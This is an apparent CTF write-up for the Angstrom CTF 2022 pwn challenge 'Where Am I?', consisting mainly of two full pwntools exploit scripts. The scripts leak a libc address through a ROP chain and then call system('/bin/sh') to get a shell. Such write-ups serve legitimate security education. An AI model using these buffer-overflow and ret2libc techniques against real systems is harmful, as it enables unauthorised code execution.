---
name: Where Am I? (2022)
event: Angstrom CTF 2022
category: Pwn
description: Writeup for Where Am I? (Pwn) - Angstrom CTF (2022) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Where Am I?

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/YmJoeoXilac/0.jpg)](https://youtu.be/YmJoeoXilac?t=3730 "Angstrom CTF 2022: Where Am I?")

## Description

> Click on the eyes.

## Solution

#### manual.py

{% code overflow="wrap" %}
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe, level='warn')
    p.sendlineafter(b'?', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './whereami'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(500))

# Start program
io = start()

counter = 0x40406c
pop_rdi = 0x401303
ret = 0x40101a

# Build the payload
payload = flat({
    offset: [
        # Leak got.puts
        pop_rdi,
        elf.got.puts,
        elf.plt.puts,
        # Reset counter with gets()
        pop_rdi,
        counter,
        elf.plt.gets,
        # Return to start for second payload
        elf.symbols._start
    ]
})

# Send payload
io.sendlineafter(b'?', payload)

# Send null bytes for gets() to overwrite counter
io.sendline(b'\x00\x00\x00\x00')

io.recvline()

# Retrieve got.puts address
got_puts = unpack(io.recvline()[:6].ljust(8, b"\x00"))
info("leaked got_puts: %#x", got_puts)
libc.address = got_puts - libc.symbols.puts
info("libc_base: %#x", libc.address)

# Build the payload
payload = flat({
    offset: [
        # Ret2system
        pop_rdi,
        next(libc.search(b'/bin/sh\x00')),
        ret,  # Stack alignment
        libc.symbols.system
    ]
})

# Send the payload
io.sendlineafter(b'?', payload)

# Got Shell?
io.interactive()
```
{% endcode %}

#### ropstar.py

{% code overflow="wrap" %}
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe, level='warn')
    p.sendlineafter(b'?', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './whereami'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(500))

# Start program
io = start()

# Create a ROP object from binary
rop = ROP(elf)

rop.puts(elf.got.puts)  # Leak got.puts
rop.gets(elf.symbols.counter)  # Reset counter with gets()
rop.call(elf.symbols._start)  # Return to start for second payload

pprint(rop.dump())  # Debugging

# Build the payload
payload = flat({
    offset: rop.chain()
})

# Send payload
io.sendlineafter(b'?', payload)

# Send null bytes for gets() to overwrite counter
io.sendline(b'\x00\x00\x00\x00')

io.recvline()

# Retrieve got.puts address
got_puts = unpack(io.recvline()[:6].ljust(8, b"\x00"))
info("leaked got_puts: %#x", got_puts)
libc.address = got_puts - libc.symbols.puts
info("libc_base: %#x", libc.address)

# Create a ROP object from lib-c
rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh\x00')))  # Ret2system

pprint(rop.dump())  # Debugging

# Build the payload
payload = flat({
    offset: [
        rop.find_gadget(['ret'])[0],  # Stack alignment
        rop.chain(),
    ]
})

# Send the payload
io.sendlineafter(b'?', payload)

# Got Shell?
io.interactive()
```
{% endcode %}
